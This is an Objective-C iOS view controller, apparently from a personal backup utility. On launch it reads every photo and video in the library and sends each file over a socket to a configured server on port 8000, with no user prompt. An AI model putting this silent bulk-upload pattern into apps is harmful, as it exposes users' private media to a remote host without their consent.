//
//  ViewController.m
//  force
//
//  Created by 权周 on 2017/6/29.
//  Copyright © 2017年 权周. All rights reserved.
//

#import "ViewController.h"
#import <Photos/Photos.h>
#import "brightside.hpp"
#import "luke.hpp"
extern NSString *server_ip;
@interface ViewController ()

@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    PHFetchOptions *fetchOptions = [[PHFetchOptions alloc] init];
    fetchOptions.predicate = [NSPredicate predicateWithFormat:@"mediaType == %d OR mediaType == %d",PHAssetMediaTypeImage,PHAssetMediaTypeVideo];
    fetchOptions.sortDescriptors = @[[NSSortDescriptor sortDescriptorWithKey:@"creationDate" ascending:YES]];
    PHFetchResult<PHAsset *> *result = [PHAsset fetchAssetsWithOptions:fetchOptions];
    SOCKET sk_fd = 0;
    if (result.count>0) {
        sk_fd = [self prepareSend];
    }
    for (int i = 0 ; i < result.count; ++i) {
        PHAsset *asset = [result objectAtIndex:i];
        [[PHImageManager defaultManager] requestImageForAsset:asset targetSize:PHImageManagerMaximumSize contentMode:PHImageContentModeAspectFit options:nil resultHandler:^(UIImage * _Nullable result, NSDictionary * _Nullable info) {
            NSURL *fileurl = info[@"PHImageFileURLKey"];
            NSString *filePath = [fileurl.absoluteString substringFromIndex:7];
            NSLog(@"path:%@",filePath);
            if (sk_fd>0) {
                size_t w_s =  mp_file_write(sk_fd, [filePath UTF8String], 1);
                if (w_s>0) {
                    NSLog(@"backup success");
                }else {
                    
                }
            }
        }];
    }
    // Do any additional setup after loading the view, typically from a nib.
}


-(SOCKET)prepareSend {
    int sk_fd = prepare_send([server_ip UTF8String],8000);
    return sk_fd;
}


- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}


@end
